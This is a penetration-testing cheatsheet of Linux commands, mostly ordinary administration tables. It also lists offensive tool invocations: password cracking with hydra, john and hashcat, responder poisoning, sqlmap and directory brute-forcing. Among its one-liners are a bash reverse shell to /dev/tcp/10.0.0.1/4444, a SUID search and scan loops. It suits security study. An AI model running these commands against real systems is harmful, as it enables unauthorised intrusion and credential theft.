# Linux Command Line Cheatsheet

A comprehensive reference of Linux commands useful during penetration testing.

## Navigation & File Operations

| Command | Description | Example |
|---------|-------------|---------|
| `pwd` | Print working directory | `pwd` |
| `ls` | List directory contents | `ls -la` |
| `cd` | Change directory | `cd /etc` |
| `cp` | Copy files or directories | `cp file.txt backup/` |
| `mv` | Move/rename files or directories | `mv file.txt newname.txt` |
| `rm` | Remove files or directories | `rm -rf directory/` |
| `mkdir` | Create directories | `mkdir -p dir1/dir2` |
| `touch` | Create empty files | `touch newfile.txt` |
| `chmod` | Change file permissions | `chmod 755 script.sh` |
| `chown` | Change file owner | `chown user:group file.txt` |
| `find` | Search for files | `find / -name "*.conf" 2>/dev/null` |
| `locate` | Find files using database | `locate password` |
| `grep` | Search for patterns in files | `grep -r "password" /etc/` |
| `which` | Show full path of commands | `which python` |
| `whereis` | Locate binary, source, and man pages | `whereis bash` |

## File Viewing & Editing

| Command | Description | Example |
|---------|-------------|---------|
| `cat` | Display file contents | `cat /etc/passwd` |
| `less` | View file with pagination | `less large_file.log` |
| `more` | View file with pagination | `more large_file.log` |
| `head` | Display first lines of file | `head -n 20 file.txt` |
| `tail` | Display last lines of file | `tail -f /var/log/auth.log` |
| `nano` | Simple text editor | `nano config.php` |
| `vi/vim` | Advanced text editor | `vim script.py` |
| `sort` | Sort file contents | `sort users.txt` |
| `uniq` | Remove duplicate lines | `sort users.txt \| uniq` |
| `diff` | Compare files | `diff file1.txt file2.txt` |
| `md5sum` | Calculate MD5 hash | `md5sum file.txt` |
| `sha256sum` | Calculate SHA256 hash | `sha256sum file.txt` |

## System Information

| Command | Description | Example |
|---------|-------------|---------|
| `uname` | Show system information | `uname -a` |
| `hostname` | Show or set hostname | `hostname` |
| `uptime` | Show system uptime | `uptime` |
| `whoami` | Show current username | `whoami` |
| `id` | Show user identity | `id` |
| `last` | Show last logged in users | `last` |
| `ps` | Show process status | `ps aux` |
| `top` | Display processes dynamically | `top` |
| `htop` | Interactive process viewer | `htop` |
| `kill` | Kill a process | `kill -9 1234` |
| `free` | Show memory usage | `free -h` |
| `df` | Show disk usage | `df -h` |
| `du` | Show directory space usage | `du -sh /var/log` |
| `lsof` | List open files | `lsof -i` |
| `lsblk` | List block devices | `lsblk` |
| `dmesg` | Display kernel messages | `dmesg \| grep USB` |

## Users & Permissions

| Command | Description | Example |
|---------|-------------|---------|
| `sudo` | Execute command as another user | `sudo -l` |
| `su` | Switch user | `su - username` |
| `useradd` | Create a new user | `useradd -m username` |
| `userdel` | Delete a user | `userdel -r username` |
| `passwd` | Change password | `passwd username` |
| `groupadd` | Create a new group | `groupadd newgroup` |
| `usermod` | Modify user account | `usermod -aG sudo username` |
| `groups` | Show group memberships | `groups username` |
| `getfacl` | Get file ACL | `getfacl file.txt` |
| `setfacl` | Set file ACL | `setfacl -m u:user:rwx file.txt` |

## Networking

| Command | Description | Example |
|---------|-------------|---------|
| `ifconfig` | Configure network interface | `ifconfig eth0` |
| `ip` | Show/manipulate routing, devices, policy | `ip addr show` |
| `ping` | Send ICMP echo request | `ping -c 4 8.8.8.8` |
| `traceroute` | Print route packets trace | `traceroute google.com` |
| `netstat` | Network statistics | `netstat -tuln` |
| `ss` | Socket statistics | `ss -tuln` |
| `nslookup` | Query DNS | `nslookup google.com` |
| `dig` | DNS lookup | `dig A google.com` |
| `host` | DNS lookup | `host google.com` |
| `whois` | WHOIS protocol client | `whois google.com` |
| `route` | Show/manipulate IP routing table | `route -n` |
| `arp` | Address Resolution Protocol | `arp -a` |
| `tcpdump` | Dump network traffic | `tcpdump -i eth0 port 80` |
| `wget` | Download files from web | `wget https://example.com/file.txt` |
| `curl` | Transfer data from/to server | `curl -I https://example.com` |
| `nc/netcat` | TCP/IP swiss army knife | `nc -lvnp 4444` |
| `ssh` | Secure shell client | `ssh user@hostname` |
| `scp` | Secure copy | `scp file.txt user@host:/path` |
| `rsync` | Remote file sync | `rsync -avz dir/ user@host:/path` |

## Text Processing

| Command | Description | Example |
|---------|-------------|---------|
| `cut` | Remove sections from lines | `cut -d: -f1 /etc/passwd` |
| `sed` | Stream editor | `sed 's/foo/bar/g' file.txt` |
| `awk` | Pattern scanning processor | `awk '{print $1}' file.txt` |
| `tr` | Translate characters | `tr 'a-z' 'A-Z' < file.txt` |
| `wc` | Count words, lines, characters | `wc -l file.txt` |
| `xargs` | Build and execute commands | `find . -name "*.txt" \| xargs grep "password"` |
| `tee` | Read from stdin and write to stdout and files | `cat file.txt \| tee copy.txt` |

## Compression & Archiving

| Command | Description | Example |
|---------|-------------|---------|
| `tar` | Tape archive | `tar -czvf archive.tar.gz directory/` |
| `gzip` | Compress files | `gzip file.txt` |
| `gunzip` | Uncompress files | `gunzip file.txt.gz` |
| `zip` | Package and compress files | `zip -r archive.zip directory/` |
| `unzip` | Extract files from ZIP archive | `unzip archive.zip` |
| `7z` | 7-Zip file archiver | `7z a archive.7z directory/` |

## Package Management

### Debian/Ubuntu

| Command | Description | Example |
|---------|-------------|---------|
| `apt` | Package management | `apt update && apt upgrade` |
| `apt-get` | Package handling utility | `apt-get install package` |
| `dpkg` | Package manager for Debian | `dpkg -i package.deb` |
| `apt-cache` | Query package cache | `apt-cache search keyword` |

### Red Hat/CentOS

| Command | Description | Example |
|---------|-------------|---------|
| `yum` | Package manager | `yum install package` |
| `dnf` | Next-generation package manager | `dnf update` |
| `rpm` | RPM Package Manager | `rpm -ivh package.rpm` |

## Process Management

| Command | Description | Example |
|---------|-------------|---------|
| `ps` | Report process status | `ps aux \| grep apache` |
| `top` | Display and update sorted process info | `top` |
| `htop` | Interactive process viewer | `htop` |
| `kill` | Send signal to process | `kill -9 1234` |
| `pkill` | Kill processes by name | `pkill apache` |
| `killall` | Kill processes by name | `killall firefox` |
| `bg` | Put a job in the background | `bg %1` |
| `fg` | Bring job to foreground | `fg %1` |
| `jobs` | List active jobs | `jobs` |
| `nohup` | Run command immune to hangups | `nohup ./script.sh &` |
| `screen` | Terminal window manager | `screen -S session_name` |
| `tmux` | Terminal multiplexer | `tmux new -s session_name` |

## Pentesting Specific

| Command | Description | Example |
|---------|-------------|---------|
| `searchsploit` | Search for exploits | `searchsploit apache 2.4.49` |
| `msfconsole` | Metasploit Framework console | `msfconsole` |
| `nmap` | Network mapper | `nmap -sV -p- 192.168.1.1` |
| `hydra` | Password cracking | `hydra -l user -P wordlist ssh://192.168.1.1` |
| `john` | Password cracking | `john --wordlist=wordlist.txt hash.txt` |
| `hashcat` | Password cracking | `hashcat -m 0 -a 0 hash.txt wordlist.txt` |
| `responder` | LLMNR/NBT-NS/mDNS poisoner | `responder -I eth0` |
| `crackmapexec` | Swiss army knife for pentesting networks | `crackmapexec smb 192.168.1.0/24` |
| `enum4linux` | Enumerate Windows/Samba hosts | `enum4linux -a 192.168.1.1` |
| `smbclient` | SMB/CIFS client | `smbclient //192.168.1.1/share -U username` |
| `wpscan` | WordPress scanner | `wpscan --url https://wordpress.site` |
| `gobuster` | Directory/file & DNS busting | `gobuster dir -u http://target -w wordlist.txt` |
| `ffuf` | Web fuzzer | `ffuf -u http://target/FUZZ -w wordlist.txt` |
| `sqlmap` | SQL injection | `sqlmap -u "http://target/page.php?id=1" --dbs` |

## Useful One-Liners

### Create a reverse shell with Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### Create a simple HTTP server
```bash
python3 -m http.server 8000
```

### Generate a random password
```bash
openssl rand -base64 12
```

### Find all SUID binaries
```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

### Find world-writable directories
```bash
find / -writable -type d 2>/dev/null
```

### Scan for open ports
```bash
for p in {1..65535}; do nc -zvn 192.168.1.1 $p 2>&1 | grep -v "Connection refused"; done
```

### Monitor file system for changes
```bash
watch -d 'ls -la /path/to/directory'
```

### Base64 encode/decode
```bash
# Encode
echo "string" | base64
# Decode
echo "c3RyaW5n" | base64 -d
```

### Extract all IP addresses from file
```bash
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' file.txt | sort -u
```

### Discover active hosts on network
```bash
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes"; done
``` 